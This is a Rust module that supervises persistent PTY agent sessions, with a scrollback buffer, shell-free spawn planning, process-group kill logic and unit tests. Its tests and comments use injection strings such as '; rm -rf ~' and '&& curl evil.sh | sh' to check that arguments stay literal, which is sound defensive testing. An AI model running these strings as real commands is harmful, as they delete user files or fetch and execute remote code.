//! Agent supervisor: PTY sessions whose processes outlive the WebSocket that
//! started them.
//!
//! `ws/shell.rs` spawns a PTY *inside* the socket handler, so closing the tab
//! kills the shell. That is right for a scratch terminal and wrong for an
//! agent: the whole point is that you close the tab, the agent keeps working,
//! and you reattach later to see what happened. So the PTY lives here, in a
//! process-global registry, and sockets merely attach to it.
//!
//! Threading follows `ws/shell.rs`: `portable-pty`'s reader is blocking and
//! gets its own OS thread, bridged to async through an `mpsc`. Nothing in this
//! module blocks the tokio executor.
//!
//! ## Security
//!
//! Agent definitions are user-supplied commands executed with the user's full
//! privileges — that is the feature. What is *not* acceptable is letting a
//! string be re-parsed by a shell: a workspace folder called `foo; rm -rf ~`
//! must be completely inert. Every spawn therefore goes through [`SpawnPlan`],
//! which carries a program and an argument *vector*, and is handed to
//! `CommandBuilder::new(prog)` + one `.arg()` per element. There is no code
//! path in this module that formats a command into a string.

use std::collections::VecDeque;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use dashmap::DashMap;
use portable_pty::{native_pty_system, ChildKiller, CommandBuilder, MasterPty, PtySize};
use sqlx::SqlitePool;
use tokio::sync::{broadcast, oneshot};
use uuid::Uuid;

use crate::error::AppError;

/// Per-session scrollback cap. Replaying a blank terminal is useless, but an
/// agent in a loop can emit megabytes, so the buffer is a ring: newest wins.
pub const SCROLLBACK_CAPACITY: usize = 256 * 1024;

/// Live (still running) sessions allowed at once. A runaway agent that spawns
/// agents would otherwise fork until the machine dies; past this the API layer
/// answers 429.
pub const MAX_LIVE_SESSIONS: usize = 16;

/// Broadcast backlog per subscriber. A subscriber slower than this lags and
/// drops frames — it never stalls the PTY reader or the other subscribers.
const OUTPUT_CHANNEL_CAPACITY: usize = 256;

/// Chunks in flight between the blocking reader thread and the async pump.
const PTY_CHANNEL_CAPACITY: usize = 64;

/// `last_activity_at` is a coarse "is anything happening" signal, not an audit
/// log. Writing it per output chunk would hammer SQLite for no benefit.
const ACTIVITY_TOUCH_INTERVAL_SECS: i64 = 10;

/// Grace period between SIGTERM and SIGKILL when killing a session's process
/// group.
#[cfg(unix)]
const KILL_GRACE: std::time::Duration = std::time::Duration::from_secs(3);

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

#[derive(Debug, thiserror::Error)]
pub enum AgentError {
    #[error("agent session '{0}' not found")]
    NotFound(String),
    #[error("workspace '{0}' not found")]
    WorkspaceNotFound(String),
    /// A workspace with no folder bound has nowhere to run. We never fall back
    /// to `$HOME`: an agent silently operating on the wrong tree is worse than
    /// an agent that refuses to start.
    #[error("workspace '{0}' has no folder bound — bind a folder before starting an agent")]
    NoWorkspaceFolder(String),
    #[error("workspace folder '{0}' is not an existing directory")]
    WorkspaceFolderMissing(String),
    #[error("agent command is empty")]
    EmptyCommand,
    #[error("too many live agent sessions ({max} max) — stop one before starting another")]
    CapacityExceeded { max: usize },
    #[error("failed to start agent: {0}")]
    Spawn(String),
    #[error("database error: {0}")]
    Database(#[from] sqlx::Error),
}

impl From<AgentError> for AppError {
    fn from(e: AgentError) -> Self {
        match e {
            AgentError::NotFound(_) | AgentError::WorkspaceNotFound(_) => {
                AppError::NotFound(e.to_string())
            }
            AgentError::NoWorkspaceFolder(_)
            | AgentError::WorkspaceFolderMissing(_)
            | AgentError::EmptyCommand => AppError::BadRequest(e.to_string()),
            AgentError::CapacityExceeded { .. } => AppError::TooManyRequests(e.to_string()),
            AgentError::Spawn(_) => AppError::Internal(e.to_string()),
            AgentError::Database(err) => AppError::Database(err),
        }
    }
}

// ---------------------------------------------------------------------------
// Scrollback ring buffer (pure — see tests)
// ---------------------------------------------------------------------------

/// A byte ring buffer that keeps the most recent `capacity` bytes.
///
/// Truncation is byte-oriented, not line- or UTF-8-oriented: a replay may start
/// mid-codepoint or mid-escape-sequence. That is the correct trade-off for a
/// terminal — xterm.js tolerates a partial sequence at the head of a stream,
/// whereas scanning for a safe boundary would mean unbounded lookahead.
#[derive(Debug)]
pub struct ScrollbackBuffer {
    capacity: usize,
    buf: VecDeque<u8>,
}

impl ScrollbackBuffer {
    pub fn new(capacity: usize) -> Self {
        Self {
            capacity,
            buf: VecDeque::new(),
        }
    }

    pub fn len(&self) -> usize {
        self.buf.len()
    }

    pub fn is_empty(&self) -> bool {
        self.buf.is_empty()
    }

    pub fn capacity(&self) -> usize {
        self.capacity
    }

    /// Appends `data`, evicting from the front so the total never exceeds
    /// `capacity`. A single write larger than the buffer keeps only its tail.
    pub fn push(&mut self, data: &[u8]) {
        if self.capacity == 0 {
            return;
        }
        if data.len() >= self.capacity {
            self.buf.clear();
            self.buf.extend(&data[data.len() - self.capacity..]);
            return;
        }
        let overflow = (self.buf.len() + data.len()).saturating_sub(self.capacity);
        self.buf.drain(..overflow);
        self.buf.extend(data);
    }

    /// The bytes to replay on attach, oldest retained byte first.
    pub fn snapshot(&self) -> Vec<u8> {
        let (a, b) = self.buf.as_slices();
        let mut out = Vec::with_capacity(a.len() + b.len());
        out.extend_from_slice(a);
        out.extend_from_slice(b);
        out
    }
}

// ---------------------------------------------------------------------------
// Spawn plan (pure — see tests)
// ---------------------------------------------------------------------------

/// A fully resolved, shell-free description of what to execute.
///
/// `program` and `args` stay separate all the way to `execvp`. Nothing here is
/// ever concatenated, quoted, or handed to `sh -c`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SpawnPlan {
    pub program: String,
    /// argv[1..]. Each element reaches the child verbatim, metacharacters and
    /// all.
    pub args: Vec<String>,
    pub cwd: PathBuf,
    /// Applied on top of the inherited environment, in order — later entries
    /// win, so a definition can deliberately override `TERM` or `KUBECONFIG`.
    pub env: Vec<(String, String)>,
}

/// Builds the spawn description. Fails only on an empty program: everything
/// else, however hostile it looks, is data.
pub fn build_spawn_plan(
    program: &str,
    args: &[String],
    cwd: &Path,
    kubeconfig: Option<&str>,
    extra_env: &[(String, String)],
) -> Result<SpawnPlan, AgentError> {
    let program = program.trim();
    if program.is_empty() {
        return Err(AgentError::EmptyCommand);
    }

    let mut env: Vec<(String, String)> = Vec::new();
    env.push(("TERM".to_string(), "xterm-256color".to_string()));
    if let Some(kc) = kubeconfig {
        if !kc.trim().is_empty() {
            env.push(("KUBECONFIG".to_string(), kc.to_string()));
        }
    }
    env.extend(extra_env.iter().cloned());

    Ok(SpawnPlan {
        program: program.to_string(),
        args: args.to_vec(),
        cwd: cwd.to_path_buf(),
        env,
    })
}

impl SpawnPlan {
    /// The one place a `SpawnPlan` becomes a process. `CommandBuilder::new`
    /// seeds argv[0] with the program and inherits the parent environment;
    /// every argument is pushed individually.
    fn to_command_builder(&self) -> CommandBuilder {
        let mut cmd = CommandBuilder::new(&self.program);
        for arg in &self.args {
            cmd.arg(arg);
        }
        cmd.cwd(&self.cwd);
        for (k, v) in &self.env {
            cmd.env(k, v);
        }
        cmd
    }
}

/// Reuses the same resolution order as `ws/shell.rs`: the stored preference
/// first, then `KUBECONFIG_PATH`, then nothing (the child inherits whatever the
/// server has).
pub async fn resolve_kubeconfig_path(db: &SqlitePool) -> Option<String> {
    sqlx::query_scalar::<_, String>(
        "SELECT value FROM user_preferences WHERE key = 'kubeconfigPath'",
    )
    .fetch_optional(db)
    .await
    .ok()
    .flatten()
    .or_else(|| std::env::var("KUBECONFIG_PATH").ok())
}

/// Resolves a workspace's bound folder into a confirmed directory.
///
/// Uses `tokio::fs` — this runs on request paths and `std::fs::metadata` would
/// block the executor.
pub async fn resolve_workspace_cwd(
    db: &SqlitePool,
    workspace_id: &str,
) -> Result<PathBuf, AgentError> {
    let folder: Option<Option<String>> =
        sqlx::query_scalar("SELECT folder_path FROM workspaces WHERE id = ?")
            .bind(workspace_id)
            .fetch_optional(db)
            .await?;

    let folder = folder
        .ok_or_else(|| AgentError::WorkspaceNotFound(workspace_id.to_string()))?
        .filter(|p| !p.trim().is_empty())
        .ok_or_else(|| AgentError::NoWorkspaceFolder(workspace_id.to_string()))?;

    let path = PathBuf::from(&folder);
    match tokio::fs::metadata(&path).await {
        Ok(meta) if meta.is_dir() => {}
        _ => return Err(AgentError::WorkspaceFolderMissing(folder)),
    }

    // Canonicalize so the child's cwd does not depend on the server's cwd or on
    // a symlink that may be re-pointed later.
    Ok(tokio::fs::canonicalize(&path).await.unwrap_or(path))
}

// ---------------------------------------------------------------------------
// Session
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SessionStatus {
    Running,
    Exited { code: Option<i32> },
}

impl SessionStatus {
    pub fn as_str(&self) -> &'static str {
        match self {
            SessionStatus::Running => "running",
            SessionStatus::Exited { .. } => "exited",
        }
    }
}

/// What the API layer needs to describe a session without touching the PTY.
#[derive(Debug, Clone, serde::Serialize)]
pub struct AgentSessionInfo {
    pub id: String,
    #[serde(rename = "workspaceId")]
    pub workspace_id: String,
    #[serde(rename = "definitionId")]
    pub definition_id: Option<String>,
    pub title: String,
    pub status: String,
    #[serde(rename = "exitCode")]
    pub exit_code: Option<i32>,
}

/// A live PTY plus everything needed to attach to it later.
///
/// Deliberately *not* holding a subscriber count: dropping the last subscriber
/// must not affect the process in any way. Detach is a no-op by construction.
pub struct AgentSession {
    pub id: String,
    pub workspace_id: String,
    pub definition_id: Option<String>,
    pub title: String,

    /// Guards the scrollback *and* the ordering of `output_tx.send`. The pump
    /// holds it across push+broadcast and `attach` holds it across
    /// snapshot+subscribe, which is what makes replay exactly-once: without
    /// that, a chunk landing between the two would be replayed and broadcast.
    scrollback: Arc<Mutex<ScrollbackBuffer>>,
    output_tx: broadcast::Sender<Arc<[u8]>>,

    /// PTY master writer. Writes are blocking, so callers go through
    /// [`AgentSession::write_input`], which hops onto the blocking pool.
    writer: Arc<Mutex<Box<dyn Write + Send>>>,
    master: Arc<Mutex<Box<dyn MasterPty + Send>>>,

    /// Fallback terminator for platforms without process groups; on unix the
    /// group kill below is what actually runs.
    killer: Mutex<Box<dyn ChildKiller + Send + Sync>>,
    pid: Option<u32>,

    status: Mutex<SessionStatus>,
}

impl AgentSession {
    pub fn status(&self) -> SessionStatus {
        self.status.lock().expect("status mutex").clone()
    }

    pub fn is_running(&self) -> bool {
        matches!(self.status(), SessionStatus::Running)
    }

    pub fn info(&self) -> AgentSessionInfo {
        let status = self.status();
        AgentSessionInfo {
            id: self.id.clone(),
            workspace_id: self.workspace_id.clone(),
            definition_id: self.definition_id.clone(),
            title: self.title.clone(),
            status: status.as_str().to_string(),
            exit_code: match status {
                SessionStatus::Exited { code } => code,
                SessionStatus::Running => None,
            },
        }
    }

    /// Subscribes to live output and returns the scrollback to replay first.
    ///
    /// Any number of callers may attach concurrently, and an exited session may
    /// still be attached to — the scrollback outlives the process so the user
    /// can read how it ended.
    pub fn attach(&self) -> (Vec<u8>, broadcast::Receiver<Arc<[u8]>>) {
        let guard = self.scrollback.lock().expect("scrollback mutex");
        let rx = self.output_tx.subscribe();
        let replay = guard.snapshot();
        (replay, rx)
    }

    /// Feeds bytes to the PTY. Safe to call from several subscribers at once;
    /// the mutex serializes them at whole-write granularity.
    pub async fn write_input(&self, data: Vec<u8>) -> std::io::Result<()> {
        let writer = self.writer.clone();
        tokio::task::spawn_blocking(move || {
            let mut w = writer.lock().expect("writer mutex");
            w.write_all(&data)?;
            w.flush()
        })
        .await
        .unwrap_or_else(|e| Err(std::io::Error::other(e)))
    }

    pub fn resize(&self, rows: u16, cols: u16) -> std::io::Result<()> {
        let master = self.master.lock().expect("master mutex");
        master
            .resize(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(std::io::Error::other)
    }

    /// Terminates the session's process **group**.
    ///
    /// Killing the pid alone is not enough: an agent typically spawns compilers,
    /// test runners and shells, and those would survive as orphans still holding
    /// the workspace. `portable-pty` calls `setsid()` in the child, so the child
    /// is a session and process-group leader and its pgid equals its pid; every
    /// descendant inherits that group unless it deliberately leaves.
    ///
    /// SIGTERM first so the agent can flush, SIGKILL after a grace period.
    pub fn kill(&self) {
        #[cfg(unix)]
        if let Some(pid) = self.pid {
            unsafe { signal_process_group(pid, libc::SIGTERM) };
            let pid_for_kill = pid;
            tokio::spawn(async move {
                tokio::time::sleep(KILL_GRACE).await;
                // Harmless if the group is already gone: killpg then fails with
                // ESRCH, and the pid cannot have been recycled while the child
                // is unreaped (the waiter thread holds it).
                unsafe { signal_process_group(pid_for_kill, libc::SIGKILL) };
            });
            return;
        }

        if let Ok(mut killer) = self.killer.lock() {
            let _ = killer.kill();
        }
    }
}

/// Signals the process group led by `pid`.
///
/// # Safety
/// Calls `killpg(2)`. `pid` must be a process id this server spawned; the
/// caller must not have reaped it, or the pgid could name an unrelated group.
#[cfg(unix)]
unsafe fn signal_process_group(pid: u32, signal: i32) {
    let pgid = {
        let queried = libc::getpgid(pid as libc::pid_t);
        if queried > 0 {
            queried
        } else {
            // The child is its own group leader (portable-pty setsid()s), so
            // its pid is its pgid even when getpgid fails.
            pid as libc::pid_t
        }
    };
    if pgid > 1 {
        libc::killpg(pgid, signal);
    }
}

// ---------------------------------------------------------------------------
// Registry
// ---------------------------------------------------------------------------

pub struct SpawnRequest {
    pub workspace_id: String,
    pub definition_id: Option<String>,
    pub title: String,
    pub program: String,
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
    pub rows: u16,
    pub cols: u16,
}

/// Process-global registry of agent PTYs. Cloneable and cheap: everything is
/// behind one `Arc`, so it can live in `AppState`.
#[derive(Clone)]
pub struct AgentRegistry {
    sessions: Arc<DashMap<String, Arc<AgentSession>>>,
    /// Serializes the capacity check with the insert. Without it, sixteen
    /// simultaneous requests could each observe fifteen live sessions.
    spawn_lock: Arc<tokio::sync::Mutex<()>>,
}

impl Default for AgentRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl AgentRegistry {
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(DashMap::new()),
            spawn_lock: Arc::new(tokio::sync::Mutex::new(())),
        }
    }

    pub fn get(&self, id: &str) -> Option<Arc<AgentSession>> {
        self.sessions.get(id).map(|e| e.value().clone())
    }

    pub fn live_count(&self) -> usize {
        self.sessions.iter().filter(|e| e.value().is_running()).count()
    }

    pub fn list(&self, workspace_id: Option<&str>) -> Vec<AgentSessionInfo> {
        self.sessions
            .iter()
            .filter(|e| match workspace_id {
                Some(ws) => e.value().workspace_id == ws,
                None => true,
            })
            .map(|e| e.value().info())
            .collect()
    }

    /// Kills a session's process group and forgets it. Scrollback goes with it,
    /// so callers that want the transcript should read it before removing.
    pub fn remove(&self, id: &str) -> Option<Arc<AgentSession>> {
        let session = self.sessions.remove(id).map(|(_, s)| s)?;
        if session.is_running() {
            session.kill();
        }
        Some(session)
    }

    /// Kills every live session. Called on shutdown — agents are not daemons,
    /// and a server restart marks their rows `exited` anyway.
    pub fn kill_all(&self) {
        for entry in self.sessions.iter() {
            if entry.value().is_running() {
                entry.value().kill();
            }
        }
    }

    /// Starts a PTY, records it in `agent_sessions`, and registers it.
    ///
    /// The returned session outlives every WebSocket that ever attaches to it:
    /// nothing in the attach path owns the child, the reader thread, or the
    /// writer, so dropping the last subscriber is a no-op for the process.
    pub async fn spawn_session(
        &self,
        db: &SqlitePool,
        req: SpawnRequest,
    ) -> Result<AgentSessionInfo, AgentError> {
        let cwd = resolve_workspace_cwd(db, &req.workspace_id).await?;
        let kubeconfig = resolve_kubeconfig_path(db).await;
        let plan = build_spawn_plan(
            &req.program,
            &req.args,
            &cwd,
            kubeconfig.as_deref(),
            &req.env,
        )?;

        let guard = self.spawn_lock.lock().await;
        if self.live_count() >= MAX_LIVE_SESSIONS {
            return Err(AgentError::CapacityExceeded {
                max: MAX_LIVE_SESSIONS,
            });
        }

        let id = Uuid::new_v4().to_string();
        let session = self.start_pty(db, &id, &req, &plan)?;

        sqlx::query(
            "INSERT INTO agent_sessions
             (id, workspace_id, definition_id, title, status, created_at, last_activity_at)
             VALUES (?, ?, ?, ?, 'running', datetime('now'), datetime('now'))",
        )
        .bind(&id)
        .bind(&req.workspace_id)
        .bind(&req.definition_id)
        .bind(&req.title)
        .execute(db)
        .await
        .inspect_err(|_| session.kill())?;

        let info = session.info();
        self.sessions.insert(id, session);
        drop(guard);

        Ok(info)
    }

    /// Opens the PTY and wires up the three long-lived workers. Split out from
    /// `spawn_session` because it is entirely synchronous.
    fn start_pty(
        &self,
        db: &SqlitePool,
        id: &str,
        req: &SpawnRequest,
        plan: &SpawnPlan,
    ) -> Result<Arc<AgentSession>, AgentError> {
        let pty_system = native_pty_system();
        let pair = pty_system
            .openpty(PtySize {
                rows: if req.rows == 0 { 24 } else { req.rows },
                cols: if req.cols == 0 { 80 } else { req.cols },
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| AgentError::Spawn(e.to_string()))?;

        let mut child = pair
            .slave
            .spawn_command(plan.to_command_builder())
            .map_err(|e| AgentError::Spawn(e.to_string()))?;

        // Drop our copy of the slave immediately. While the parent holds it the
        // slave fd stays open, so the master reader would never see EOF and the
        // session would look alive forever after the child exits.
        drop(pair.slave);

        let mut reader = pair
            .master
            .try_clone_reader()
            .map_err(|e| AgentError::Spawn(e.to_string()))?;
        let writer = pair
            .master
            .take_writer()
            .map_err(|e| AgentError::Spawn(e.to_string()))?;

        let pid = child.process_id();
        let killer = child.clone_killer();

        let (output_tx, _) = broadcast::channel::<Arc<[u8]>>(OUTPUT_CHANNEL_CAPACITY);
        let scrollback = Arc::new(Mutex::new(ScrollbackBuffer::new(SCROLLBACK_CAPACITY)));

        let session = Arc::new(AgentSession {
            id: id.to_string(),
            workspace_id: req.workspace_id.clone(),
            definition_id: req.definition_id.clone(),
            title: req.title.clone(),
            scrollback: scrollback.clone(),
            output_tx: output_tx.clone(),
            writer: Arc::new(Mutex::new(writer)),
            master: Arc::new(Mutex::new(pair.master)),
            killer: Mutex::new(killer),
            pid,
            status: Mutex::new(SessionStatus::Running),
        });

        // Thread 1 — blocking PTY reader. Ends at EOF, which happens once the
        // child exits and the slave fd is fully closed.
        let (pty_tx, mut pty_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(PTY_CHANNEL_CAPACITY);
        std::thread::spawn(move || {
            let mut buf = [0u8; 8192];
            loop {
                match reader.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        if pty_tx.blocking_send(buf[..n].to_vec()).is_err() {
                            break;
                        }
                    }
                }
            }
        });

        // Task — fans output out to subscribers. Holds the scrollback lock
        // across push+broadcast so `attach` cannot interleave (see `attach`).
        // `broadcast::send` never blocks and never fails on a full or empty
        // subscriber set, so a stalled socket cannot back up the PTY.
        let pump_db = db.clone();
        let pump_id = id.to_string();
        tokio::spawn(async move {
            let mut last_touch: i64 = 0;
            while let Some(chunk) = pty_rx.recv().await {
                let chunk: Arc<[u8]> = chunk.into();
                {
                    let mut sb = scrollback.lock().expect("scrollback mutex");
                    sb.push(&chunk);
                    let _ = output_tx.send(chunk);
                }

                let now = chrono::Utc::now().timestamp();
                if now - last_touch >= ACTIVITY_TOUCH_INTERVAL_SECS {
                    last_touch = now;
                    let _ = sqlx::query(
                        "UPDATE agent_sessions SET last_activity_at = datetime('now') WHERE id = ?",
                    )
                    .bind(&pump_id)
                    .execute(&pump_db)
                    .await;
                }
            }
        });

        // Thread 2 — reaps the child. `wait()` is blocking and must not run on
        // the executor; it hands the status to an async task via oneshot.
        let (exit_tx, exit_rx) = oneshot::channel::<Option<i32>>();
        std::thread::spawn(move || {
            let code = child.wait().ok().map(|s| s.exit_code() as i32);
            let _ = exit_tx.send(code);
        });

        // Task — records the exit. The session stays in the registry with its
        // scrollback intact so the user can still attach and read the ending.
        let exit_db = db.clone();
        let exit_session = session.clone();
        tokio::spawn(async move {
            let code = exit_rx.await.ok().flatten();
            *exit_session.status.lock().expect("status mutex") = SessionStatus::Exited { code };
            let _ = sqlx::query(
                "UPDATE agent_sessions
                 SET status = 'exited', exit_code = ?, exited_at = datetime('now'),
                     last_activity_at = datetime('now')
                 WHERE id = ?",
            )
            .bind(code.map(|c| c as i64))
            .bind(&exit_session.id)
            .execute(&exit_db)
            .await;
        });

        Ok(session)
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scrollback_keeps_everything_below_capacity() {
        let mut sb = ScrollbackBuffer::new(16);
        sb.push(b"hello ");
        sb.push(b"world");
        assert_eq!(sb.len(), 11);
        assert_eq!(sb.snapshot(), b"hello world".to_vec());
    }

    #[test]
    fn scrollback_truncates_at_capacity() {
        let mut sb = ScrollbackBuffer::new(8);
        sb.push(b"0123456789");
        assert_eq!(sb.len(), 8);
        assert_eq!(sb.capacity(), 8);
    }

    #[test]
    fn replay_after_truncation_returns_the_newest_bytes() {
        // The whole point of the ring: reattaching mid-task must show what just
        // happened, not what happened first.
        let mut sb = ScrollbackBuffer::new(8);
        sb.push(b"0123456789");
        assert_eq!(sb.snapshot(), b"23456789".to_vec());

        sb.push(b"abc");
        assert_eq!(sb.snapshot(), b"56789abc".to_vec());
        assert_eq!(sb.len(), 8);
    }

    #[test]
    fn scrollback_single_write_larger_than_capacity_keeps_its_tail() {
        let mut sb = ScrollbackBuffer::new(4);
        sb.push(b"xx");
        sb.push(b"ABCDEFGH");
        assert_eq!(sb.snapshot(), b"EFGH".to_vec());
    }

    #[test]
    fn scrollback_zero_capacity_keeps_nothing() {
        let mut sb = ScrollbackBuffer::new(0);
        sb.push(b"anything");
        assert!(sb.is_empty());
        assert_eq!(sb.snapshot(), Vec::<u8>::new());
    }

    #[test]
    fn scrollback_stays_bounded_across_many_writes() {
        let mut sb = ScrollbackBuffer::new(1024);
        for _ in 0..5000 {
            sb.push(b"an agent looping and printing a line\n");
        }
        assert_eq!(sb.len(), 1024);
    }

    fn plan_for(program: &str, args: &[&str]) -> SpawnPlan {
        build_spawn_plan(
            program,
            &args.iter().map(|s| s.to_string()).collect::<Vec<_>>(),
            Path::new("/tmp/ws"),
            None,
            &[],
        )
        .expect("plan")
    }

    #[test]
    fn spawn_plan_keeps_program_and_argv_separate() {
        let plan = plan_for("claude", &["--print", "do the thing"]);
        assert_eq!(plan.program, "claude");
        assert_eq!(plan.args, vec!["--print", "do the thing"]);
        assert_eq!(plan.cwd, PathBuf::from("/tmp/ws"));
    }

    #[test]
    fn spawn_plan_never_builds_a_shell_string() {
        // A hostile argument must stay one literal argv element, and the
        // program must never become a shell.
        let plan = plan_for("agent", &["; rm -rf ~", "$(whoami)", "&& curl evil.sh | sh"]);
        assert_eq!(plan.program, "agent");
        assert!(!plan.program.contains("sh"));
        assert_eq!(plan.args.len(), 3);
        assert_eq!(plan.args[0], "; rm -rf ~");
        assert_eq!(plan.args[1], "$(whoami)");
        assert_eq!(plan.args[2], "&& curl evil.sh | sh");
    }

    #[test]
    fn spawn_plan_carries_a_hostile_cwd_verbatim() {
        // A workspace folder named `foo; rm -rf ~` is a path, not a command.
        let dir = Path::new("/tmp/foo; rm -rf ~");
        let plan = build_spawn_plan("agent", &[], dir, None, &[]).expect("plan");
        assert_eq!(plan.cwd, dir);
        assert!(plan.args.is_empty());
    }

    #[test]
    fn spawn_plan_rejects_an_empty_program() {
        assert!(matches!(
            build_spawn_plan("", &[], Path::new("/tmp"), None, &[]),
            Err(AgentError::EmptyCommand)
        ));
        assert!(matches!(
            build_spawn_plan("   ", &[], Path::new("/tmp"), None, &[]),
            Err(AgentError::EmptyCommand)
        ));
    }

    #[test]
    fn spawn_plan_sets_term_and_kubeconfig_when_configured() {
        let plan = build_spawn_plan(
            "agent",
            &[],
            Path::new("/tmp"),
            Some("/home/u/.kube/config"),
            &[],
        )
        .expect("plan");
        assert_eq!(
            plan.env,
            vec![
                ("TERM".to_string(), "xterm-256color".to_string()),
                (
                    "KUBECONFIG".to_string(),
                    "/home/u/.kube/config".to_string()
                ),
            ]
        );
    }

    #[test]
    fn spawn_plan_omits_kubeconfig_when_unset_or_blank() {
        let plan = build_spawn_plan("agent", &[], Path::new("/tmp"), None, &[]).expect("plan");
        assert_eq!(plan.env, vec![("TERM".to_string(), "xterm-256color".to_string())]);

        let blank =
            build_spawn_plan("agent", &[], Path::new("/tmp"), Some("  "), &[]).expect("plan");
        assert_eq!(blank.env.len(), 1);
    }

    #[test]
    fn spawn_plan_env_merge_order_lets_the_definition_win() {
        let extra = vec![
            ("TERM".to_string(), "dumb".to_string()),
            ("MY_VAR".to_string(), "1".to_string()),
        ];
        let plan =
            build_spawn_plan("agent", &[], Path::new("/tmp"), Some("/kc"), &extra).expect("plan");
        // Order matters: CommandBuilder::env is last-write-wins, so the
        // definition's TERM must come after the default.
        assert_eq!(
            plan.env
                .iter()
                .map(|(k, _)| k.as_str())
                .collect::<Vec<_>>(),
            vec!["TERM", "KUBECONFIG", "TERM", "MY_VAR"]
        );
        assert_eq!(plan.env.last().unwrap().1, "1");
        assert_eq!(plan.env[2].1, "dumb");
    }

    #[test]
    fn capacity_error_maps_to_429() {
        let err: AppError = AgentError::CapacityExceeded { max: 16 }.into();
        assert!(matches!(err, AppError::TooManyRequests(_)));
    }

    #[test]
    fn missing_workspace_folder_maps_to_400_not_a_home_fallback() {
        let err: AppError = AgentError::NoWorkspaceFolder("ws1".into()).into();
        match err {
            AppError::BadRequest(msg) => assert!(msg.contains("bind a folder")),
            other => panic!("expected BadRequest, got {other:?}"),
        }
    }

    #[test]
    fn empty_registry_has_no_live_sessions() {
        let reg = AgentRegistry::new();
        assert_eq!(reg.live_count(), 0);
        assert!(reg.list(None).is_empty());
        assert!(reg.get("nope").is_none());
    }
}
